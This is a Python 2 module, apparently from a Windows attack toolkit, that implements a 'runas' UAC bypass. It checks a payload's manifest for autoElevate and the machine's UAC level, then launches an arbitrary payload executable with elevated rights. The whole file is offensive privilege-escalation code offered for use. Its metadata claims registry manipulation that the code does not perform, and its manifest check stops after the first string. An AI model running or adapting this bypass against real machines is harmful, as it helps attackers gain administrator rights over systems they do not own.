import os
import _winreg
from core.utils import *
from core.prints import *

runas_info = {
        "Description": "Bypass UAC using runas, this only works if UAC is set to never notify",
        "Method": "Registry key manipulation",
		"Id" : "01",
		"Type" : "UAC bypass",
		"Fixed In" : "99999",
		"Works From": "7600",
		"Admin": False,
		"Function Name" : "runas",
		"Function Payload" : True,
    }

def manifests(payload):
	strings = ["<autoElevate>true</autoElevate>",
				"<autoElevate xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</autoElevate>"]
	
	try:
		manifest = open(os.path.join(payload), "rb").read()
	except Exception as error:
		return False

	for string in strings:
		if (string in manifest):
			return True
		else:
			return False

def runas(payload):
	if (payloads().exe(payload) == True):
		if (os.path.isfile(os.path.join(payload)) == True):
			if (manifests(os.path.join(payload)) == True):
				process().runas(os.path.join(payload))
			else:
				if (information().admin() == True):
					print_error("Cannot proceed, we are already elevated")
					return False
				else:
					if (information().uac_level() == 1):
						if (process().runas(os.path.join(payload)) == True):
							print_success("Successfully elevated process ({})".format(os.path.join(payload)))
						else:
							print_error("Unable to elevate process ({})".format(os.path.join(payload)))
					else:
						print_error("Unable to execute payload ({}) UAC level is to high".format(os.path.join(payload)))
						return False
		else:
			print_error("Unable to execute payload ({}) cannot find payload on disk".format(os.path.join(payload)))
			return False
	else:
		print_error("Cannot proceed, invalid payload")
		return False							